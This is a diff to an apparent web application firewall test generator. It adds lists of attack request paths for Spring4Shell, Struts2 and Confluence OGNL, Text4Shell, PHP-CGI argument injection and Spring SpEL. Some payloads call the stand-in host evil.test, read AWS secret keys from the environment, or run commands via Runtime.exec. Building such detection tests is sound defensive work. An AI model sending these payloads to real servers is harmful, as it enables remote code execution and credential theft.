@@ -650,6 +650,56 @@ def main() -> None:
     for i, p in enumerate(jndi_paths):
         add("log4shell", f"203.0.115.{v4_last(10 + i)}", "GET", p)
 
+    # Java/Template RCE — Spring4Shell (CVE-2022-22965), Struts2 OGNL,
+    # Text4Shell (CVE-2022-42889). Ham form: waf_rules.c java_rce_patterns.
+    java_rce_paths = [
+        "/spring?class.module.classLoader.resources.context.parent.pipeline.first.pattern=x",
+        "/app?bean.class.module.classLoader.URLs%5B0%5D=x",
+        "/x?d.class.classLoader.resources.dirContext.docBase=/tmp",
+        "/struts?redirect=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS",
+        "/action?x=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)",
+        "/s2?y=(%23context=new+java.lang.ProcessBuilder)",
+        "/text?q=${script:javascript:java.lang.Runtime}",
+        "/text2?q=${url:UTF-8:http://evil.test/x}",
+        "/text3?q=${dns:address|evil.test}",
+        "/tpl?x=${env:AWS_SECRET_ACCESS_KEY}",
+        "/spring2?class.module.classLoader.resources=1",
+        "/ognl?z=%23_memberAccess%5B%22allowStaticMethodAccess%22%5D=true",
+        "/commons?q=${script:js:java.lang.Runtime.getRuntime()}",
+        "/struts3?p=@ognl.OgnlRuntime@getRuntime",
+        "/spring3?class.module.classLoader.DefaultAssertionStatus=1",
+    ]
+    for i, p in enumerate(java_rce_paths):
+        add("java_rce", f"203.0.120.{v4_last(10 + i)}", "GET", p)
+
+    # Modern uygulama RCE — PHP-CGI CVE-2024-4577 (arg injection) + Spring SpEL.
+    # Ham form: waf_rules.c modern_rce_patterns.
+    modern_rce_paths = [
+        "/php-cgi/php-cgi.exe?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input",
+        "/index.php?-d+allow_url_include=1+-d+auto_prepend_file=php://input",
+        "/cgi-bin/php?%ADd+cgi.force_redirect%3D0+%ADd+auto_prepend_file%3D/tmp/x",
+        "/api?exp=T(java.lang.Runtime).getRuntime().exec('id')",
+        "/spel?x=T(java.lang.ProcessBuilder)",
+        "/eval?q=%23this.getClass().forName('java.lang.Runtime')",
+        "/route?spring.cloud.function.routing-expression=T(java.lang.Runtime)",
+        "/php?-d+allow_url_include%3d1",
+    ]
+    for i, p in enumerate(modern_rce_paths):
+        add("modern_rce", f"203.0.121.{v4_last(10 + i)}", "GET", p)
+
+    # Enterprise OGNL — Confluence CVE-2022-26134, Struts WebWork stack.
+    # Ham form: waf_rules.c enterprise_ognl_patterns.
+    enterprise_ognl_paths = [
+        "/confluence?x=ognl.OgnlUtil%23getValue",
+        "/wiki/pages/createpage.action?queryString=ognl.OgnlUtil",
+        "/x?cmd=com.opensymphony.xwork2.ActionContext.getContainer",
+        "/struts2?foo=webwork.util.ValueStack%23findValue",
+        "/atlassian?p=confluence.webwork.ServletAction",
+        "/api?expr=DefaultMemberAccess%26_memberAccess",
+    ]
+    for i, p in enumerate(enterprise_ognl_paths):
+        add("enterprise_ognl", f"203.0.122.{v4_last(10 + i)}", "GET", p)
+
     crlf_paths = [
         "/api/redirect?url=%0d%0aSet-Cookie:evil=1",
         "/proxy?target=foo%0d%0aX-Injected:1",
